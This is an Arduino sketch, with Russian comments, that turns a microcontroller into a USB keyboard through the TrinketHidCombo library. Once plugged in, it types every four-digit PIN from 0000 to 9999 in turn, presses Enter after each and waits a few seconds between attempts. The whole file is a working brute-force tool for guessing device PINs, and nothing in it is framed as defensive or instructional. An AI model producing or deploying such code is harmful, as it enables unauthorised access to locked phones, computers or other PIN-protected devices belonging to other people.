#include "TrinketHidCombo.h"
void setup(){
pinMode(4,INPUT); //USB d- (белый) PORT D4 задан в usbconfig.h
pinMode(2,INPUT);// USB d+ (зелёный) PORT D2 задан в usbconfig.h
pinMode (5,OUTPUT);  //программное включение юсб порта PORT D5  задан в usbconfig.h
TrinketHidCombo.begin(); // запустите движок USB-устройства и перечислите
}

void loop() 
{
  TrinketHidCombo.poll();
  
  int dig1, dig2, dig3, dig4; // Цифры, которые будут последовательно вводиться
  byte keys[10] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39  }; // Массив с ASCII кодами цифер от 0 до 9 соответственно

// Перебираем комбинации, начиная  с 0000:

  for(dig1=0; dig1<10; dig1++)
  {
    for(dig2=0; dig2<10; dig2++)
    {
      for(dig3=0; dig3<10; dig3++)
      {
        for(dig4=0; dig4<10; dig4++)
        {
          pressKey(keys[dig1]);
          pressKey(keys[dig2]);
          pressKey(keys[dig3]);
          pressKey(keys[dig4]);
          TrinketHidCombo.pressKey(0, KEYCODE_ENTER); // Клавиша Enter
          TrinketHidCombo.pressKey(0, 0); // Отпустить все кнопки программно
          delay(5000);
        }
      }
    }
  }
}

void pressKey(byte dig) // Функция ввода
{
  TrinketHidCombo.typeChar(dig);
  delay(1000);
}
